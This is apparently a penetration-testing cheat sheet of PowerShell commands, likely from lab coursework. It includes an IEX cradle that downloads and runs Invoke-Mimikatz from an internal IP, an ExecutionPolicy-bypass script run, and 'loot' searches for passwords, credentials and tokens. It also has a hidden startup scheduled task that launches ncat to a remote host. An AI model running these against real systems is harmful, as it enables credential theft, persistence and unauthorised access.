# Windows PowerShell Reference

## Web / Download

```powershell
# HTTP GET (headers + body)
Invoke-WebRequest -Uri "https://example.com" -Method GET

# Download a file (wget alternative)
Invoke-WebRequest -Uri "https://example.com/tools.zip" -OutFile "C:\Temp\tools.zip"

# Download using .NET WebClient
(New-Object Net.WebClient).DownloadFile("https://example.com/tools.zip", "C:\Temp\tools.zip")

# Save and execute a remote script (be careful!)
Invoke-WebRequest -Uri "https://example.com/script.ps1" -OutFile "$env:TEMP\script.ps1"; powershell -ExecutionPolicy Bypass -File "$env:TEMP\script.ps1"

# Execute a remote script Alt
IEX(New-Object System.Net.WebClient).DownloadString('http://172.16.1.30/Invoke-Mimikatz.ps1')
```

## Enumeration

```powershell
# Local users and groups
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"

# Inspect a single user
Get-LocalUser -Name "Administrator" | Get-Member

# Active Directory (requires RSAT / domain access)
Get-ADUser -Filter *

# Services
Get-Service | Select-Object DisplayName, Name, Status | Sort-Object DisplayName
Get-Service | Where-Object {$_.DisplayName -like '*Defender*'}
Get-Service -ComputerName ACADEMY-ICL-DC

# Processes
Get-Process | Sort-Object CPU -Descending | Select-Object -First 20
```

## Loot folders & history

```powershell
# Show hidden files in current folder
Get-ChildItem -Hidden

# PSReadLine console history path
Get-Content (Get-PSReadlineOption).HistorySavePath

# Common paths to check for secrets
$paths = @(
  "$env:USERPROFILE\AppData\Roaming",
  "$env:USERPROFILE\AppData\Local\Microsoft\Windows\PowerShell",
  "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
)
$paths
```

## Searching for loot (grep-like)

```powershell
# Count files under a path
(Get-ChildItem -Path C:\ -File -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count

# Find files by name pattern (recursive)
Get-ChildItem -Path N:\ -Include '*cred*' -File -Recurse -ErrorAction SilentlyContinue

# Search file contents for keywords (fast)
Get-ChildItem -Path N:\ -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password','credential','key' -List

# Combined: limit types and search for secrets
Get-ChildItem -Path C:\Users\ -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.txt','.ps1','.py','.md','.csv' } | Select-String -Pattern 'password','credential','key','token' -List

# Example output interpretation
# N:\Contracts\private\secret.txt:1:file with all credentials
# N:\Contracts\private\credentials.txt:1:admin:SecureCredentials!
```

## Scheduled Tasks (creation / modification)

```powershell
# Create a scheduled task via schtasks (Powershell wrapper)
schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -Command \"Start-Process cmd.exe -ArgumentList '/c C:\\Temp\\ncat.exe 172.16.1.100 8100' -NoNewWindow\""

# Modify task account / password
schtasks /change /tn "My Secret Task" /ru Administrator /rp "P@ssw0rd"

# Delete a task
schtasks /delete /tn "My Secret Task" /f

# List tasks (verbose)
schtasks /query /v /fo list
```

## Quick Notes

- Use `Select-String` (alias `sls`) instead of `findstr` for richer PowerShell output objects.
- `Get-ChildItem` + `Select-String` returns objects you can further filter, export, or parse.
- AD enumeration requires appropriate privileges and RSAT modules.
- Downloading and executing remote scripts is common in labs but treat as high risk on real systems.
- Use `-ErrorAction SilentlyContinue` on recursive searches to avoid noisy permission errors.
